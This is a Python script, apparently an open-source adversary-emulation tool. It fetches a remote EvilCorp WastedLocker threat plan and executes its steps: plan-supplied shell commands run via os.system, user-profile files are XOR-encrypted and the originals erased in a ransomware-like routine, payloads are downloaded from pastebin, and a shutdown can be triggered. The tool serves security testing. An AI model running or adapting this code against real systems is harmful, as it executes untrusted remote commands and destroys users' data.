#!/usr/bin/env python3
#
# PennyScythe.py is a Python3 script that ingests and runs adversarial emulation
# plans from SCYTHE's Community Threats Repository 
# [https://github.com/scythe-io/community-threats]
# 
# The script has only been tested with the EvilCorp WastedLocker threat plan, 
# and would likely require enhancements to work with other plans
#
# Usage: PennyScythe.py

# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#
# DISCLAIMER: I don't work for Scythe and this project is in no way associated 
# with or endorsed by scythe.io.  Use at your own risk!
#
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#
# Author:   Mike Gualtieri
# Blog:     https://www.mike-gualtieri.com
# Twitter:  https://twitter.com/mlgualtieri
# GitHub:   https://github.com/mlgualtieri/PennyScythe
#

import os, time, sys, urllib.request, json, shutil

# Emulate EvilCorp WastedLocker
EMULATION_PLAN_URL = "https://raw.githubusercontent.com/scythe-io/community-threats/master/EvilCorp/WastedLocker_scythe_threat.json"

# Default time to sleep between steps in plan
DEFAULT_SLEEP      = 5

# Likely only useful to your author 
DEBUG              = False


def doRun(request):
    print("         > Running:", request)
    time.sleep(DEFAULT_SLEEP)
    ### Debug
    if DEBUG == True:
        request = "ls /tmp"
    os.system(request)



def doFile(request):
    print("         > File:", request)
    time.sleep(DEFAULT_SLEEP)

    req  = request.split(" ")

    if "--create" in req:
        path  = req[ req.index("--path")  + 1].strip('\"')
        size  = req[ req.index("--size")  + 1]
        count = int(req[ req.index("--count") + 1])

        path  = path.replace("%USERPROFILE%", os.environ["USERPROFILE"])

        ### Debug
        if DEBUG == True:
            path = "/tmp/scythe/important_files.wasted"

        # Convert size to bytes
        if size.endswith("MB"):
            size = int(size[:-2]) * 1024 * 1024

        # Creating file(s)
        for i in range(count):
            f = open(path + str(i+1), "wb")
            f.seek(size - 1)
            f.write(b"\0")
            f.close()
            # Insert a short delay between each file creation
            time.sleep(0.01)



# A standard Python XOR implementation
def doXOR(data, key): 
    return bytearray(a^b for a, b in zip(*map(bytearray, [data, key]))) 



# We'll use XOR encryption since it's simple to implement
def doCrypt(request):
    print("         > Crypt:", request)
    time.sleep(DEFAULT_SLEEP)

    req  = request.split(" ")

    target    = req[ req.index("--target")  + 1].strip('\"')
    password  = req[ req.index("--password")  + 1].strip('\"')

    target    = target.replace("%USERPROFILE%", os.environ["USERPROFILE"])

    if DEBUG == True:
        target = "/tmp/scythe"

    doErase   = False
    doRecurse = False

    if "--erase" in req:
        doErase = True

    # Ignore recurse for now
    if "--recurse" in req:
        doRecurse = True

    allfiles = os.listdir(target)

    for filename in allfiles:
        outfile  = filename + ".xor"
        outfile  = os.path.join(target, outfile)
        filename = os.path.join(target, filename)

        with open(filename, mode='rb') as file:
            data = file.read()
            enc = doXOR(data, password.encode())
            out = open(outfile, 'wb+')
            out.write(enc)
            out.close()

        if doErase == True:
            os.remove(filename)



def doDownloader(request):
    print("         > Download :", request)
    time.sleep(DEFAULT_SLEEP)

    req  = request.split(" ")
    src  = req[ req.index("--src")  + 1].strip('\"')
    dest = req[ req.index("--dest") + 1].strip('\"')

    dest = dest.replace("%USERPROFILE%", os.environ["USERPROFILE"])
    
    # Make sure we pull the "raw" file
    src  = src.replace("pastebin.com/","pastebin.com/raw/")

    ### Debug
    if DEBUG == True:
        dest = "/tmp/scythe/wasted_info.txt"

    print("            Source :", src)
    print("              Dest :", dest)

    r = urllib.request.Request(src)
    rs = urllib.request.urlopen(r)
    data = rs.read()

    out = open(dest, 'wb')
    out.write(data)
    out.close()




def doController(request):
    print("         > Controller :", request)
    time.sleep(DEFAULT_SLEEP)

    if request == "--shutdown":
        print("\n\nController is requesting to initiate a shutdown. Proceed? [y/N] ", end="")
        theInput = input().lower()
        
        if theInput == "y":
            print("Shutting down...")
            time.sleep(DEFAULT_SLEEP)
            os.system("shutdown /s /t 0")
        else:
            print("Skipping shutdown...")




def startEmulation(emulation_plan_url):
    with urllib.request.urlopen(emulation_plan_url) as url:
        emulation_plan = json.loads(url.read().decode())
    
    
    print("Threat      :", emulation_plan["threat"]["display_name"])
    print("Description :", emulation_plan["threat"]["description"])
    print("Platform    :", emulation_plan["threat"]["operating_system_name"].capitalize())
    
    print('')
    print("\nReady to start? [Y/n] ", end="")
    doStart = input().lower()
    
    if doStart == "n":
        exit()
    
    
    print("\nStarting emulation...")
    
    for i in emulation_plan["threat"]["script"]:
        step = emulation_plan["threat"]["script"][i]
    
        if "type" in step:
            if step["type"] == "message":
    
                # Skip over initialization and loader steps
                valid_modules = ["run","file","crypt","downloader","controller"]
    
                if step["module"] in valid_modules:
    
                    if "rtags" in step:
                        for tag in step["rtags"]:
                            _tag = tag.split(":")
                            if(_tag[0] == "att&ck-technique"):
                                print("\n    Emulating ATT&CK Technique : ", _tag[1], " [https://attack.mitre.org/techniques/", _tag[1] ,"]", sep = "")
                    
                    if "module" in step:
                        if step["module"] == "run":
                            doRun(step["request"])
                        elif step["module"] == "file":
                            doFile(step["request"])
                        elif step["module"] == "crypt":
                            doCrypt(step["request"])
                        elif step["module"] == "downloader":
                            doDownloader(step["request"])
                        elif step["module"] == "controller":
                            doController(step["request"])
    
    print("Done!")




def banner():
    print('')
    print('                             `-://+sssyyyysso/:-.`                              ')
    print('                       `-/shmNmmdhhyoooooo+osyhdmNmhs+:.                        ')
    print('                   `:ohmmmhso:`                  `:/+ymMds:`                    ')
    print('                 :ymNdo/.         `.--:::::--..`       ./shmy/`                 ')
    print('              -ommmo.       ./oydNNMMMMMMMNMMMNNNmdhso/./:-.:smy/               ')
    print('            :ymd+.`     ./ymNMNmmdhhhyyhhhdmNMMMMMMMMMN+Nym   `/hdo`            ')
    print('          -ydh/`     `/shyo/-.```         ````.:+shmMMsdmNo      `+ho`          ')
    print('        `omd:        ..`                           ``::myN`        `/y+`        ')
    print('       :hm+`    `                                     :mh.           `:s-       ')
    print('      ohh. -/+shh                   //////////-       dMs              `o/      ')
    print('    `sNs`.shmddhd-                 .MMMMMMMMMMo      :MN.                /+     ')
    print('   `+h+ -sshddhhy:               ./mMMMMMMMMMMo      hMs                  -+    ')
    print('   /s: -o+yddhhs:             yhdNMMMMMMMMMMMMo     -MN.                   -+   ')
    print('  :s/ .o:-oyhhy`             `MMMMMMMMMMMMMMMMo     hMy             .yo:`   --  ')
    print(' `/y  +:+syyhy.              `MMMMMMMMMMMMMMMMo    -MM.            `ssyyyo:  :` ')
    print(' :y. :o-+-+sh:               `MMMMMMMMMMMMMMMMo    yMy             :yyys/yh`  - ')
    print(' -h  s//:-:+o                `MMMMMMMMMMMMMMMMo   .MM-              sssosyyo  + ')
    print(' +/ -+:+:-:o.                 ::::yMMMMMMMMMMMo   yMh               :sssoyyy` --')
    print(' h` :o-/-//o                      +MMMMMMMMMMMo  .MM-                syysyyy-  .')
    print(' d  +o--:/::                      +MMMMMMMMMMMo  sMh                 +oyssyy/  `')
    print('`m  +o./:++/                      +MMMMMMMMMMMo .NM-                 :oy:oyy+  `')
    print('`m  +y.:./+/                      +MMMMMMMMMMMo sMh                  +o:--sm+  .')
    print(' d` :s:/-:o+                      +MMMMMMMMMMMo`NM:                  o+:-/sm:  -')
    print(' y/ `yo:/:o/-                     +MMMMMMMMMMMooMd                  -so/+oyh`  `')
    print(' /y  ss/s:o++                     oMMMMMMMMMMMyNM:                  o+o/yoyo  ` ')
    print(' /d/ -s:o:-oo-                ```-mMMMMMMMMMMMNMm``                :s/o/oom.  . ')
    print(' -hm. +syo++s:.               ommNMMMMMMMMMMMMMMNmo               :o+/ohoy+  `` ')
    print(' `odh` syy:/oyo               sMMMMMMMMMMMMMMMMMMMy              :y/osooyo   .  ')
    print('  -ydy` +ysh/s+/              sMMMMMMMMMMMMMMMMMMMy            `/+/o+hoss`  -   ')
    print('   :oms  -sho+os              sMMMMMMMMMMMMMMMMMMMy           -s+++ysoss`  :`   ')
    print('    :ymy`  -+so+:             sMMMMMMMMMMMMMMMMMMMy         .ososs+ysh+  `-`    ')
    print('     :dNh-   `:+h+`           /yyyyyyyyyyyyyyyyyyy+       `:so+y+sysy-  .:`     ')
    print('      .ydmo`    `/y+.                                    .sysysdhhs:` `+-       ')
    print('        /hmh/`     :ss:`                                `oysymdhs/  `/o`        ')
    print('         `ommd+-     `/yy+.                         `./sddhhy+:`  -/o.          ')
    print('           `odmNs-`     `:+                   ``-:syhy+:.`     `-oy:            ')
    print('             `+dNNNs:`                     .syyyo/-`       `./yds.              ')
    print('                -ohMNNyo:`                            `.:ohNmy:`                ')
    print('                   .+yNMMMmhhso//:-..`          `-+oydNMNmy+.                   ')
    print('                       -/sdNMMMMMMMMMNmmmdddmmNNMMMMMmy+:`                      ')
    print('                            .:/osyddmNNNNNNmmdhys+:.`                           ')
    print('')
    print('                               -= PennyScythe =-')
    print('                     -= Adversarial Emulation on the Cheap =-')
    print('')
    print('Note: This project is in no way associated with or endorsed by scythe.io!')




def main(argv):
    try:
        banner()
        print('')
        startEmulation(EMULATION_PLAN_URL)
    except KeyboardInterrupt:
        # Gracefully exit on ctrl-c
        print("\nBye!")
        pass


if __name__ == "__main__":
    main(sys.argv[1:])


